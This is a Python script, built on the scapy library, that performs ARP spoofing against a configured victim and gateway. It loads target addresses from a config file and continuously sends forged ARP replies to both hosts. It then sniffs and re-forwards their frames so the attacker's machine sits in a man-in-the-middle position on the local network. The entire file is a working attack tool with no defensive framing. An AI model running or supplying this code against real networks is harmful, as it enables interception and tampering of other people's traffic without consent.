import configparser
import ipaddress
import os
import sys
import threading

# Constants
CONFIG_PATH = 'config.ini'
ARP_RESPONSE = 2


def load_scapy():
    """
    Load the scapy path from the config file
    """
    config = configparser.ConfigParser()
    config.read(CONFIG_PATH)
    scapy_path = config.get('DEFAULT', 'scapy_path')
    if os.path.exists(scapy_path):
        sys.path.append(scapy_path)
    else:
        print(f"Invalid scapy path: {scapy_path}")
        sys.exit(1)
    
    
# Third-party imports
load_scapy()
from scapy.all import *


def is_valid_interface(interface):
    """
    Check if the given interface is valid.
    Args:
        interface (str): Name of the network interface to be checked.
    Returns:
        bool: True if interface is valid, otherwise False.
    """
    try:
        available_interfaces = os.popen('ip link show').read()
        return interface in available_interfaces
    except OSError:
        return False


def is_valid_mac(mac):
    """
    Check if the given MAC address is valid.
    Args:
        mac (str): MAC address to be checked.
    Returns:
        bool: True if MAC address is valid, otherwise False.
    """
    parts = mac.split(':')
    
    if len(parts) != 6:
        return False
    
    for part in parts:
        if not 0 <= int(part, 16) <= 255:
            return False
    
    return True


def is_valid_ip(ip):
    """
    Check if the given IP address is valid.
    Args:
        ip (str): IP address to be checked.
    Returns:
        bool: True if IP address is valid, otherwise False.
    """
    try:
        ipaddress.ip_address(ip)
        return True
    except:
        return False


def load_config():
    """
    Load configuration from config.ini file.
    Args:
        None
    Returns:
        dict: Dictionary containing configuration values.
    """
    config = configparser.ConfigParser()
    config.read(CONFIG_PATH)
    
    expected_keys = {'victim_mac', 'victim_ip', 'gateway_mac', 'gateway_ip', 'attacker_mac', 'interface', 'scapy_path'}
    config_keys = set(config['DEFAULT'].keys())
    if config_keys != expected_keys:
        raise ValueError("config.ini contains unexpected parameters")

    victim_mac = config.get('DEFAULT', 'victim_mac')
    victim_ip = config.get('DEFAULT', 'victim_ip')
    gateway_mac = config.get('DEFAULT', 'gateway_mac')
    gateway_ip = config.get('DEFAULT', 'gateway_ip')
    attacker_mac = config.get('DEFAULT', 'attacker_mac')
    interface = config.get('DEFAULT', 'interface')
    
    ips = [victim_ip, gateway_ip]
    macs = [victim_mac, gateway_mac, attacker_mac]
    
    for ip in ips:
        if not is_valid_ip(ip):
            raise ValueError(f"Invalid IP address: {ip}")
            
    for mac in macs:
        if not is_valid_mac(mac):
            raise ValueError(f"Invalid MAC address: {mac}")
            
    if not is_valid_interface(interface):
        raise ValueError(f"Invalid interface: {interface}")

    return victim_mac, victim_ip, gateway_mac, gateway_ip, attacker_mac, interface


def spoof(victim_mac, victim_ip, gateway_mac, gateway_ip):
    """
    Continuously send ARP packets to establish the attacker 
    in a Man-in-the-Middle position. 
    Args:
        victim_mac (str) : MAC address of the victim.
        victim_ip (str)  : IP address of the victim.
        gateway_mac (str): MAC address of the gateway.
        gateway_ip (str) : IP address of the gateway.
    Returns:
        None
    """
    while True:
        sendp(Ether(dst=victim_mac)/ARP(op=ARP_RESPONSE, psrc=gateway_ip, pdst=victim_ip))
        sendp(Ether(dst=gateway_mac)/ARP(op=ARP_RESPONSE, psrc=victim_ip, pdst=gateway_ip))


def forward_pkt(pkt, src_dst, attacker_mac, gateway_mac, s):
    """
    Forward packets to the appropriate destination after altering them.
    Args:
        pkt (Packet)      : Packet captured by the sniffer.
        src_dst (dict)    : Dictionary mapping source MAC addresses to their destinations.
        attacker_mac (str): MAC address of the attacker.
        gateway_mac (str) : MAC address of the gateway.
        s (L2socket)      : Layer 2 socket for packet sending
    Returns:
        None
    """
    pkt[Ether].dst = src_dst.get(pkt[Ether].src, gateway_mac)
    pkt[Ether].src = attacker_mac
    try:
        frags = fragment(pkt, fragsize=1400)
        for frg in frags:
            s.send(frg)
    except:
        try:
            s.send(Ether(pkt))
        except:
            pass


def main():
    """
    Main function that sets up and initiates the ARP spoofing and packet forwarding.
    """
    victim_mac, victim_ip, gateway_mac, gateway_ip, attacker_mac, interface = load_config()

    src_dst = {
        gateway_mac: victim_mac,
        victim_mac: gateway_mac,
    }

    # Precreate the layer 2 socket so we can reuse it
    s = conf.L2socket(iface=interface)

    # Only parse Ethernet layer when sniffing
    conf.layers.filter([Ether])
    
    spoof_thread = threading.Thread(target=spoof, args=(victim_mac, victim_ip, gateway_mac, gateway_ip))
    spoof_thread.start()

    sniff(iface=interface, prn=lambda pkt: forward_pkt(pkt, src_dst, attacker_mac, gateway_mac, s), filter="ether src %s or ether src %s" % (victim_mac, gateway_mac))


if __name__ == '__main__':
    main()

